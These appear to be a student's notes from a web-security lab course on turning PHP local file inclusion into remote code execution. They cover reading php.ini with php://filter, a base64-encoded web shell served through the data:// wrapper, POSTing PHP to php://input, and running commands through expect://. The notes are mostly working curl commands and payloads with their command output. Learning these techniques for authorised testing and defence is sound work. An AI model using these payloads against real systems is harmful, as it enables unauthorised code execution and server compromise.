## Data
* The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code
* However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations
* So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability

#### Checking PHP Configurations
* File is found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version
* We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file
* We will also use the `base64` filter we used in the previous section, as `.ini` files are similar to `.php` files and should be encoded to avoid breaking
* Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it

```sh
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

```sh
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

* `This option is not enabled by default`, and is required for several other LFI attacks, like using the `input` wrapper or for any RFI attack
* It is `not uncommon to see this option enabled`, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example

#### Remote Code Execution
* With `allow_url_include` enabled, we can proceed with our `data` wrapper attack
* As mentioned earlier, the `data` wrapper can be used to include external data, including PHP code
* We can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code

```sh
$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=
```

* `http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGV<SNIP>&cmd=id`

![](3.%20Completed/File%20Inclusion/RCE/Screenshots/data_wrapper_id.png)

* We can also use cURL

```sh
$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzd<SNIP>&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Input
* The [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code
* The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data
* So, the vulnerable parameter must accept POST requests for this attack to work
* `Input` wrapper also depends on the `allow_url_include` setting

```sh
$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

## Expect
* We may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams
* We don't need to provide a web shell, as it is designed to execute commands
* Expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases

```sh
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

* We can use the `expect://` wrapper and then pass the command we want to execute

```sh
$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

